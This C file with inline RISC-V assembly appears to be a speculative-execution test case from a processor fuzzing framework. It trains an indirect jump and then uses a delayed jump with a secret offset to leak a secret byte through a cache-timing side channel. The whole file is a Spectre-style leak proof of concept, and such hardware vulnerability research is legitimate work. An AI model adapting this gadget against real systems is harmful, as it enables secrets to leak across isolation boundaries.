#include <stdio.h>
#include <string.h>

#include "util.h"
#include "encoding.h"
#include "parafuzz.h"
#include "boom_conf.h"

PARAFUZZ_DEFINE;

void exploit(int64_t offset) {
  leak_me:
    INFO_TEXE_START;
    uint8_t dummy3 = array[trapoline[offset]*CACHE_BLOCK];
    INFO_TEXE_END;
}

void safe(int64_t offset) {}

void victim(int64_t offset, void* next) {
  INFO_VCTM_START;

  uint64_t dummy1 = 0xa234b057963aef89ul;
  uint64_t dummy2 = 0x56fea3467def0136ul;

  INFO_DELAY_START;
  asm("fcvt.s.lu	fa4, %[dummy1]\n"
      "fcvt.s.lu	fa5, %[dummy2]\n"
      "fdiv.s	fa5, fa5, fa4\n"
      "fdiv.s	fa5, fa5, fa4\n"
      "fdiv.s	fa5, fa5, fa4\n"
      "fdiv.s	fa5, fa5, fa4\n"
      "fcvt.lu.s	%[dummy2], fa5, rtz\n"
      "add %[dummy2], %[dummy2], %[next]\n"
      INFO_INLINE_ASM(ENUM_INFO_DELAY_END)
      "add a0, zero, %[offset]\n"
      "jalr ra, 0(%[dummy2])\n"
      : [dummy2] "+r" (dummy2)
      : [dummy1] "r" (dummy1), 
        [next] "r" (next),
        [offset] "r" (offset)
      : "ra", "a0", "fa4", "fa5");

  INFO_VCTM_END;
}

int main(int argc, char* argv[] ) {
  setup();
  guess = get_round_info();

  int64_t secret_offset = (unsigned char*)&secret[LEAK_TARGET] - (unsigned char*)&trapoline;
  victim(0, &exploit);
  victim(secret_offset, &safe);
  uint64_t res = access_time(&array[0], guess, 0);

  dump_channel(res, &array[0] + guess*CACHE_BLOCK);
  exit(0);
  return 0;
}
